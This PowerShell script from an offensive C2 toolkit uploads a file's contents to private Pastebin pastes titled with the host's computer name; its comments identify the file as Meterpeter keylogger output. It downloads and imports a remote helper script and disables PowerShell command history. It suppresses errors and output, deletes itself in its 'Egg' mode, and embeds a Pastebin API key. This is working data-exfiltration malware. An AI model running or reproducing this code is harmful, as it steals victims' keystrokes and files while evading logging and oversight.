<#
.SYNOPSIS
   Get filepath contents and paste it to pastebin.
    
   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: Inv`oke-We`bRequ`est {native}
   Optional Dependencies: Out-PasteBin.ps1 {auto}
   PS cmdlet Dev version: v1.1.5
   
.DESCRIPTION
   Uses Out-PasteBin.ps1 cmdlet to take the contents of -filepath 'string'
   and creates a new pastebin paste from it on the sellected account with
   sellected time intervals (120 sec) a max of 20 times (20 pastes max)

.NOTES
   PasteBin accepts the max of 20 pastes per day on 'free' accounts.
   So -MaxPastes 'int' and -TimeOut 'int' must be careful calculated.
   Eg: -maxpastes '20' -timeout '1' will reach 20 pastes in 20 sec
   
.Parameter FilePath
   The filepath to send to pastebin

.Parameter PastebinUsername
   PasteBin UserName to authenticate to

.Parameter PastebinPassword
   PasteBin Password to authenticate to

.Parameter PastebinDeveloperKey
   The pasteBin API key to authenticate with

.Parameter MaxPastes
   The max number of pastes to create (max: 20)

.Parameter TimeOut
   Create paste each xxx seconds (min: 120)
   Remark: No time limmit if -maxpastes '1'

.EXAMPLE
   PS C:\> Get-Help .\SendToPasteBin.ps1 -full
   Access this cmdlet comment based help!

.EXAMPLE
   PS C:\> .\SendToPasteBin.ps1 -FilePath "test.log" -PastebinUsername "r00t-3xp10it" -PastebinPassword "MyS3cr3TPassword"
   Get the contents of -filepath 'string' and creates a new pastebin paste from it on the sellected pastebin account.

.EXAMPLE
   PS C:\> .\SendToPasteBin.ps1 -FilePath "test.log" -timeout "120" -maxpastes "10" -PastebinUsername "r00t-3xp10it" -PastebinPassword "MyS3cr3TPassword"
   Get the contents of -filepath 'string' and creates a new pastebin paste from it each 120 seconds a max of 10 pastes on the sellected pastebin account.

.INPUTS
   None. You cannot pipe objects into SendToPasteBin.ps1

.OUTPUTS
   * Out-PasteBin aux cmdlet
   * Downloading Out-PasteBin cmdlet ..
     + Maxpastes_Counter  : 1º paste

   * Out-PasteBin cmdlet by BankSecurity
   * PastebinDeveloperKey : 1ab4a1a4e39c94db4f653127a45e7159
     + PastebinUsername   : r00t-3xp10it
     + PasteTitle         : SKYNET_15_33_15
   * PasteBin Url: https://pastebin.com/jVT6BKWL
   * PasteBin accepts the max of 20 pastes per day.

     + Maxpastes_Counter  : 2º paste

   * Out-PasteBin cmdlet by BankSecurity
   * PastebinDeveloperKey : 1ab4a1a4e39c94db4f653127a45e7159
     + PastebinUsername   : r00t-3xp10it
     + PasteTitle         : SKYNET_15_35_15
   * PasteBin Url: https://pastebin.com/GiK9DASD
   * PasteBin accepts the max of 20 pastes per day.
  
.LINK
   https://github.com/r00t-3xp10it/meterpeter
   https://github.com/r00t-3xp10it/redpill/blob/main/bin/Out-Pastebin.ps1
#>


#CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$PastebinDeveloperKey='1ab4a1a4e39c94db4f653127a45e7159',
   [string]$PastebinUsername="r00t-3xp10it",
   [string]$PasteTitle="$Env:COMPUTERNAME",
   [string]$FilePath="$Env:TMP\void.log",
   [string]$PastebinPassword="s3cr3t",
   [string]$Egg="False",
   [int]$MaxPastes='1',
   [int]$TimeOut='120'
)


$cmdletVersion = "v1.1.5"
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "SendToPasteBin $cmdletVersion"
If($Egg -ieq "False")
{
   write-host "`n* SendToPasteBin aux cmdlet" -ForegroundColor Green
}

## Limmit ranges
If($MaxPastes -gt 20)
{
   ## Max pastes allowed
   [int]$MaxPastes = 10
}

## Min loop jump timeout
If($TimeOut -lt 120)
{
   ## No time limmit if 1 paste
   If($MaxPastes -gt 1)
   {
      [int]$TimeOut = 120
   }
}


For($i=0; $i -lt $MaxPastes; $i++)
{
   Start-Sleep -Seconds $TimeOut ## Loop jump timeout
   If(-not(Test-Path -Path "$Env:TMP\Out-Pastebin.ps1" -EA SilentlyContinue))
   {
      ## Download Out-Pastebin cmdlet from my github repository
      If($Egg -ieq "False"){write-host "* Downloading Out-PasteBin cmdlet .." -ForegroundColor Green}
      iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Out-Pastebin.ps1" -OutFile "$Env:TMP\Out-Pastebin.ps1"|Unblock-File   
   }

   If($Egg -ieq "False")
   {
      ## Display OnScreen the loop counter!
      write-host "  + " -ForegroundColor DarkYellow -NoNewline
      write-host "Maxpastes_Counter  : " -NoNewline
      write-host "${i}" -ForegroundColor Green -NoNewline
      write-host "º paste"
   }

   ## Make sure that -FilePath 'file' exists
   If(Test-path -Path "$FilePath" -EA SilentlyContinue)
   {
      ## Parse filepath data (@Meterpeter keylogger)
      $ParseDatas = (Get-Content -Path "$FilePath")
      echo $ParseDatas > "$Env:TMP\ParseData.log"

      $rand = (Get-Date -Format 'HH:mm:ss') -replace ':','_'
      Import-Module -Name "$Env:TMP\Out-PasteBin.ps1" -Force
      Out-Pastebin -InputObject $(Get-Content -Path "$Env:TMP\ParseData.log") -PasteTitle "${PasteTitle}_${rand}" -ExpiresIn "1W" -Visibility "Private" -PastebinUsername "$PastebinUsername" -PastebinPassword "$PastebinPassword" -PastebinDeveloperKey "$PastebinDeveloperKey"

      ## Local Cleanup
      Remove-Item -Path "$Env:TMP\parsedata.log" -Force
   }
}


## Cleanup
Remove-Item -Path "$Env:TMP\parsedata.log" -Force
Remove-Item -Path "$Env:TMP\Out-PasteBin.ps1" -Force
If($Egg -ieq "True")
{
   ## Auto-Delete this cmdlet (@Meterpeter C2 internal function)
   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
}